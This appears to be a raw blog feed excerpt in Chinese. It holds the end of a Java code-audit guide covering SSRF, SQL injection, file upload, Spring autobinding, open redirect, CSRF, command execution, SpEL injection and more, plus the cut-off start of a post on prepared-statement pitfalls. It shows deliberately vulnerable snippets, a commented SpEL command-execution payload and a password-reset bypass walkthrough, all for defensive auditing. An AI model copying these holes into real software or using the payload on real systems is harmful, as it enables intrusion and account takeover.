title="漏洞示例"></a>漏洞示例</h3><p>此处以HttpURLConnection为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(<span class="string">"picurl"</span>);</span><br><span class="line">StringBuffer response = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">URL pic = <span class="keyword">new</span> URL(url);</span><br><span class="line">HttpURLConnection con = (HttpURLConnection) pic.openConnection();</span><br><span class="line">con.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">con.setRequestProperty(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0"</span>);</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(con.getInputStream()));</span><br><span class="line">String inputLine;</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     response.append(inputLine);</span><br><span class="line">&#125;</span><br><span class="line">in.close();</span><br><span class="line">modelMap.put(<span class="string">"resp"</span>,response.toString());</span><br><span class="line"><span class="keyword">return</span> <span class="string">"getimg.htm"</span>;</span><br></pre></td></tr></table></figure><h3 id="审计函数-2"><a href="#审计函数-2" class="headerlink" title="审计函数"></a>审计函数</h3><p>程序中发起HTTP请求操作一般在获取远程图片、页面分享收藏等业务场景,在代码审计时可重点关注一些HTTP请求操作函数，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h5><ul><li>使用白名单校验HTTP请求url地址</li><li>避免将请求响应及错误信息返回给用户</li><li>禁用不需要的协议及限制请求端口,仅仅允许http和https请求等</li></ul><h2 id="0x03-SQLi"><a href="#0x03-SQLi" class="headerlink" title="0x03 SQLi"></a>0x03 SQLi</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>注入攻击的本质，是程序把用户输入的数据当做代码执行。这里有两个关键条件，第一是用户能够控制输入；第二是用户输入的数据被拼接到要执行的代码中从而被执行。sql注入漏洞则是程序将用户输入数据拼接到了sql语句中，从而攻击者即可构造、改变sql语义从而进行攻击。</p><h3 id="漏洞示例-3"><a href="#漏洞示例-3" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以Mybatis框架为例，示例sql片段如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> books <span class="keyword">where</span> <span class="keyword">id</span>= $&#123;<span class="keyword">id</span>&#125;</span><br></pre></td></tr></table></figure><p>对于Mybatis框架下SQL注入漏洞的审计可参考<a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&mid=2727827368&idx=1&sn=765d0835f0069b5145523c31e8229850&mpshare=1&scene=1&srcid=0926a6QC3pGbQ3Pznszb4n2q" target="_blank" rel="noopener">Mybatis框架下SQL注入漏洞面面观</a></p><h3 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h3><p>Mybatis框架SQL语句安全写法应使用#{},避免使用动态拼接形式${}，ibatis则使用#变量#。安全写法如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> books <span class="keyword">where</span> <span class="keyword">id</span>= <span class="comment">#&#123;id&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-文件上传漏洞"><a href="#0x04-文件上传漏洞" class="headerlink" title="0x04 文件上传漏洞"></a>0x04 文件上传漏洞</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>文件上传过程中，通常因为未校验上传文件后缀类型，导致用户可上传jsp等一些webshell文件。代码审计时可重点关注对上传文件类型是否有足够安全的校验，以及是否限制文件大小等。</p><h3 id="漏洞示例-4"><a href="#漏洞示例-4" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以MultipartFile为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleFileUpload</span><span class="params">(MultipartFile file)</span></span>&#123;</span><br><span class="line">    String fileName = file.getOriginalFilename();</span><br><span class="line">    <span class="keyword">if</span> (fileName==<span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"file is error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String filePath = <span class="string">"/static/images/uploads/"</span>+fileName;</span><br><span class="line">    <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            BufferedOutputStream stream =</span><br><span class="line">                    <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(filePath)));</span><br><span class="line">            stream.write(bytes);</span><br><span class="line">            stream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"You failed to upload "</span> + file.getOriginalFilename() + <span class="string">" because the file was empty."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-3"><a href="#审计函数-3" class="headerlink" title="审计函数"></a>审计函数</h3><p>java程序中涉及到文件上传的函数，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MultipartFile</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用白名单校验上传文件类型、大小限制</li></ul><h2 id="0x05-Autobinding"><a href="#0x05-Autobinding" class="headerlink" title="0x05 Autobinding"></a>0x05 Autobinding</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>Autobinding-自动绑定漏洞，根据不同语言/框架，该漏洞有几个不同的叫法，如下：</p><ul><li>Mass Assignment: Ruby on Rails, NodeJS</li><li>Autobinding: Spring MVC, ASP.NET MVC</li><li>Object injection: PHP(对象注入、反序列化漏洞)</li></ul><p>软件框架有时允许开发人员自动将HTTP请求参数绑定到程序代码变量或对象中，从而使开发人员更容易地使用该框架。这里攻击者就可以利用这种方法通过构造http请求，将请求参数绑定到对象上，当代码逻辑使用该对象参数时就可能产生一些不可预料的结果。</p><h3 id="漏洞示例-5"><a href="#漏洞示例-5" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>示例代码以<a href="https://github.com/GrrrDog/ZeroNights-HackQuest-2016" target="_blank" rel="noopener">ZeroNights-HackQuest-2016</a>的demo为例，把示例中的justiceleague程序运行起来，可以看到这个应用菜单栏有about，reg，Sign up，Forgot password这4个页面组成。我们关注的点是密码找回功能，即怎么样绕过安全问题验证并找回密码。</p><p>1）首先看reset方法，把不影响代码逻辑的删掉。这样更简洁易懂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResetPasswordController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> UserService userService;</span><br><span class="line">...</span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetHandler</span><span class="params">(@RequestParam String username, Model model)</span> </span>&#123;</span><br><span class="line">User user = userService.findByName(username);</span><br><span class="line"><span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.addAttribute(<span class="string">"user"</span>, user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"redirect: resetQuestion"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里从参数获取username并检查有没有这个用户，如果有则把这个user对象放到Model中。因为这个Controller使用了@SessionAttributes(“user”)，所以同时也会自动把user对象放到session中。然后跳转到resetQuestion密码找回安全问题校验页面。</p><p>2）resetQuestion密码找回安全问题校验页面有resetViewQuestionHandler这个方法展现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewQuestionHandler</span><span class="params">(@ModelAttribute User user)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome resetQuestion ! "</span> + user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了@ModelAttribute User user，实际上这里是从session中获取user对象。但存在问题是如果在请求中添加user对象的成员变量时则会更改user对象对应成员的值。<br>所以当我们给resetQuestionHandler发送GET请求的时候可以添加“answer=hehe”参数，这样就可以给session中的对象赋值，将原本密码找回的安全问题答案修改成“hehe”。这样在最后一步校验安全问题时即可验证成功并找回密码</p><h3 id="审计函数-4"><a href="#审计函数-4" class="headerlink" title="审计函数"></a>审计函数</h3><p>这种漏洞一般在比较多步骤的流程中出现，比如转账、找密等场景，也可重点留意几个注解如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@SessionAttributes</span><br><span class="line">@ModelAttribute</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>更多信息可参考<a href="https://xianzhi.aliyun.com/forum/topic/1089/" target="_blank" rel="noopener">Spring MVC Autobinding漏洞实例初窥</a></p><h3 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h3><p>Spring MVC中可以使用@InitBinder注解，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="0x06-URL重定向"><a href="#0x06-URL重定向" class="headerlink" title="0x06 URL重定向"></a>0x06 URL重定向</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>由于Web站点有时需要根据不同的逻辑将用户引向到不同的页面，如典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致URL重定向问题，攻击者构造恶意跳转的链接，可以向用户发起钓鱼攻击。</p><h3 id="漏洞示例-6"><a href="#漏洞示例-6" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以Servlet的redirect 方式为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String site = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">if</span>(!site.isEmpty())&#123;</span><br><span class="line">response.sendRedirect(site);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-5"><a href="#审计函数-5" class="headerlink" title="审计函数"></a>审计函数</h3><p>java程序中URL重定向的方法均可留意是否对跳转地址进行校验、重定向函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect</span><br><span class="line">setHeader</span><br><span class="line">forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-6"><a href="#修复方案-6" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用白名单校验重定向的url地址</li><li>给用户展示安全风险提示，并由用户再次确认是否跳转</li></ul><h2 id="0x07-CSRF"><a href="#0x07-CSRF" class="headerlink" title="0x07 CSRF"></a>0x07 CSRF</h2><h3 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h3><p>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</p><h3 id="漏洞示例-7"><a href="#漏洞示例-7" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>由于开发人员对CSRF的了解不足，错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。例如，一个博客删除文章是通过如下方式实现的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://blog.com/article/delete.jsp?id=102</span><br></pre></td></tr></table></figure><p>当攻击者诱导用户点击下面的链接时，如果该用户登录博客网站的凭证尚未过期，那么他便在不知情的情况下删除了id为102的文章，简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><h3 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h3><p>此类漏洞一般都会在框架中解决修复，所以在审计csrf漏洞时。首先要熟悉框架对CSRF的防护方案，一般审计时可查看增删改请求重是否有token、formtoken等关键字以及是否有对请求的Referer有进行校验。手动测试时,如果有token等关键则替换token值为自定义值并重放请求，如果没有则替换请求Referer头为自定义链接或置空。重放请求看是否可以成功返回数据从而判断是否存在CSRF漏洞。</p><h3 id="修复方案-7"><a href="#修复方案-7" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>Referer校验，对HTTP请求的Referer校验，如果请求Referer的地址不在允许的列表中，则拦截请求。</li><li>Token校验，服务端生成随机token，并保存在本次会话cookie中，用户发起请求时附带token参数，服务端对该随机数进行校验。如果不正确则认为该请求为伪造请求拒绝该请求。</li><li>Formtoken校验，Formtoken校验本身也是Token校验，只是在本次表单请求有效。</li><li>对于高安全性操作则可使用验证码、短信、密码等二次校验措施</li><li>增删改请求使用POST请求</li></ul><h2 id="0x08-命令执行"><a href="#0x08-命令执行" class="headerlink" title="0x08 命令执行"></a>0x08 命令执行</h2><h3 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h3><p>由于业务需求，程序有可能要执行系统命令的功能，但如果执行的命令用户可控，业务上有没有做好限制，就可能出现命令执行漏洞。</p><h3 id="漏洞示例-8"><a href="#漏洞示例-8" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以getRuntime为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><h3 id="审计函数-6"><a href="#审计函数-6" class="headerlink" title="审计函数"></a>审计函数</h3><p>这种漏洞原理上很简单，重点是找到执行系统命令的函数，看命令是否可控。在一些特殊的业务场景是能判断出是否存在此类功能，这里举个典型的实例场景,有的程序功能需求提供网页截图功能，笔者见过多数是使用phantomjs实现，那势必是需要调用系统命令执行phantomjs并传参实现截图。而参数大多数情况下应该是当前url或其中获取相关参数，此时很有可能存在命令执行漏洞，还有一些其它比较特别的场景可自行脑洞。</p><p>java程序中执行系统命令的函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec</span><br><span class="line">ProcessBuilder.start</span><br><span class="line">GroovyShell.evaluate</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-8"><a href="#修复方案-8" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>避免命令用户可控</li><li>如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等</li></ul><h2 id="0x09-权限控制"><a href="#0x09-权限控制" class="headerlink" title="0x09 权限控制"></a>0x09 权限控制</h2><h3 id="介绍-9"><a href="#介绍-9" class="headerlink" title="介绍"></a>介绍</h3><p>越权漏洞可以分为水平、垂直越权两种,程序在处理用户请求时未对用户的权限进行校验，使的用户可访问、操作其他相同角色用户的数据，这种情况是水平越权；如果低权限用户可访问、操作高权限用户则的数据，这种情况为垂直越权。</p><h3 id="漏洞示例-9"><a href="#漏洞示例-9" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/getUserInfo"</span>,method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUserInfo</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userid = request.getParameter(<span class="string">"userid"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!userid.isEmpty())&#123;</span><br><span class="line">        String info=userModel.getuserInfoByid(userid);</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-7"><a href="#审计函数-7" class="headerlink" title="审计函数"></a>审计函数</h3><p>水平、垂直越权不需关注特定函数，只要在处理用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞</p><h3 id="修复方案-9"><a href="#修复方案-9" class="headerlink" title="修复方案"></a>修复方案</h3><p>获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。</p><h2 id="0x10-批量请求"><a href="#0x10-批量请求" class="headerlink" title="0x10 批量请求"></a>0x10 批量请求</h2><h3 id="介绍-10"><a href="#介绍-10" class="headerlink" title="介绍"></a>介绍</h3><p>业务中经常会有使用到发送短信校验码、短信通知、邮件通知等一些功能，这类请求如果不做任何限制，恶意攻击者可能进行批量恶意请求轰炸，大量短信、邮件等通知对正常用户造成困扰，同时也是对公司的资源造成损耗。</p><p>除了短信、邮件轰炸等，还有一种情况也需要注意，程序中可能存在很多接口，用来查询账号是否存在、账号名与手机或邮箱、姓名等的匹配关系，这类请求如不做限制也会被恶意用户批量利用，从而获取用户数据关系相关数据。对这类请求在代码审计时可关注是否有对请求做鉴权、和限制即可大致判断是否存在风险。</p><h3 id="漏洞示例-10"><a href="#漏洞示例-10" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/ifUserExit"</span>,method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ifUserExit</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String phone = request.getParameter(<span class="string">"phone"</span>);</span><br><span class="line">    <span class="keyword">if</span>(! phone.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">boolean</span> ifex=userModel.ifuserExitByPhone(phone);</span><br><span class="line">        <span class="keyword">if</span> (!ifex)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"用户不存在"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"用户已被注册"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复方案-10"><a href="#修复方案-10" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>对同一个用户发起这类请求的频率、每小时及每天发送量在服务端做限制，不可在前端实现限制</li></ul><h2 id="0x11-第三方组件安全"><a href="#0x11-第三方组件安全" class="headerlink" title="0x11 第三方组件安全"></a>0x11 第三方组件安全</h2><h3 id="介绍-11"><a href="#介绍-11" class="headerlink" title="介绍"></a>介绍</h3><p>这个比较好理解，诸如Struts2、不安全的编辑控件、XML解析器以及可被其它漏洞利用的如commons-collections:3.1等第三方组件，这个可以在程序pom文件中查看是否有引入依赖。即便在代码中没有应用到或很难直接利用，也不应该使用不安全的版本，一个产品的周期很长，很难保证后面不会引入可被利用的漏洞点。</p><h3 id="修复方案-11"><a href="#修复方案-11" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用最新或安全版本的第三方组件</li></ul><h2 id="0x12-SPel注入"><a href="#0x12-SPel注入" class="headerlink" title="0x12 SPel注入"></a>0x12 SPel注入</h2><h3 id="介绍-12"><a href="#介绍-12" class="headerlink" title="介绍"></a>介绍</h3><p>Spel是Spring框架el表达式的缩写，当使用SpelExpressionParser解析spel表达式，且表达式可被外部控制，则可能导致SPel表达式注入从而造成RCE，如<a href="https://github.com/Cryin/Paper/blob/master/CVE-2018-1260%20spring-security-oauth2%20RCE%20Analysis.md" target="_blank" rel="noopener">CVE-2018-1260</a>就是spring-security-oauth2的一个SPel注入导致的RCE 。</p><h3 id="漏洞示例-11"><a href="#漏洞示例-11" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(path = <span class="string">"/elinjection"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SPelInjectionController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value=<span class="string">"/spel.html"</span>,method= RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SPelInjection</span><span class="params">(ModelMap modelMap, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String el=request.getParameter(<span class="string">"el"</span>);</span><br><span class="line">        <span class="comment">//el="T(java.lang.Runtime).getRuntime().exec(\"open /Applications/Calculator.app\")";</span></span><br><span class="line">        ExpressionParser PARSER = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        Expression exp = PARSER.parseExpression(el);</span><br><span class="line">        <span class="keyword">return</span> (String)exp.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复方案-12"><a href="#修复方案-12" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>解析el表达式时，参数不要由外部用户输入</li></ul><h2 id="0x13-总结"><a href="#0x13-总结" class="headerlink" title="0x13 总结"></a>0x13 总结</h2><p>除了上述相关的漏洞，在代码审计的时候有时会遇到一些特别的漏洞，比如开发为了测试方便关闭掉了一些安全校验函数、甚至未彻底清除的一些预留后门及测试管理接口等。除此，框架本身的安全问题也是可以深挖。一些安全校验、安全解决方案也未必就毫无破绽的，即便存在一些安全解决，但开发人员有没有使用以及是否正确使用安全方案都是可能存在问题的点。大公司都有成熟的框架，一些基本的安全问题并不是太多，但设计层面上的安全及流程相关的问题却基本依赖开发的经验。流程相关的漏洞则有必要先熟悉应用本身的设计和逻辑，这块也是潜在的风险点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java敏感函数&quot;&gt;&lt;a href=&quot;#Java敏感函数&quot; class=&quot;headerlink&quot; title=&quot;Java敏感函数&quot;&gt;&lt;/a&gt;Java敏感函数&lt;/h1&gt;&lt;p&gt;因为最近开发插件见到了很多敏感函数，记录记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-XXE&quot;&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL预编译失效</title>
    <link href="http://bai-ren-1.github.io/2020/07/16/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E5%A4%B1%E6%95%88/"/>
    <id>http://bai-ren-1.github.io/2020/07/16/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E5%A4%B1%E6%95%88/</id>
    <published>2020-07-16T12:51:53.000Z</published>
    <updated>2020-07-16T13:27:44.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL预编译失效"><a href="#SQL预编译失效" class="headerlink" title="SQL预编译失效"></a>SQL预编译失效</h1><p>之前写了一篇《SQL预编译绕过》，其实这篇也没啥。只是提一下在某些特殊情况下，模板语句处理的不好其实也是会导致即使使用了预编译也会导致SQL注入的。</p><h2 id="0x00-动态拼接"><a href="#0x00-动态拼接" class="headerlink" title="0x00 动态拼接"></a>0x00 动态拼接</h2><p>语句参数是动态拼接的话，其实用不用SQL预编译都一个样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接拼接（不安全的写法）</span><br><span class="line">String sql = &quot;select * from product where pname = &quot; + name;</span><br></pre></td></tr></table></figure><p>正确的做法是要进行参数绑定啦：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数绑定（安全的写法）</span><br><span class="line">String sql = &quot;select * from db_user where username = ?&quot;;</span><br><span class="line">PreparedStatement stmt = connection.prepareStatement(sql);</span><br><span class="line">stmt.setString(1,name);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="0x01-order-by"><a href="#0x01-order-by" class="headerlink" title="0x01 order by"></a>0x01 order by</h2><p>order by 后面的语句，是不能够用<strong>预编译进行处理</strong>的，只能通过拼接进行操作，因此需要手动过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select * from userinfo where id = ? &quot;+&quot;order by &apos;&apos;&quot; + age + &quot;&apos; asc&apos;&quot; ;</span><br><span class="line">ps = conn.prepareStatement(sql);</span><br><span class="line">ps.setInt(1,id);</span><br><span class="line">rs = ps.executeQuery();</span><br></pre></td></tr></table></figure><p>所以假如上面没有对order by 的参数age进行过滤的话，就会照成SQL注入。</p><blockquote><p>所以渗透中看到sort等参数就很大可能存在SQL注入。</p></blockquote><p>order by后面不能参数绑定的原因：</p><ul><li>预编译又只有自动加引号的setString()方法，没有不加引号的方法；</li><li>order by后接的字段名不能有引号；</li></ul><p>所以如果order by后面的参数使用动态绑定，就会因为引号问题报语法错误。所以order by后面只能以动态拼接的方式来执行，但是很多傻逼开发不知道怎么过滤或者根本不知道得过滤，就导致一抓一个准。</p><h2 id="0x02-思考"><a href="#0x02-思考" class="headerlink" title="0x02 思考"></a>0x02 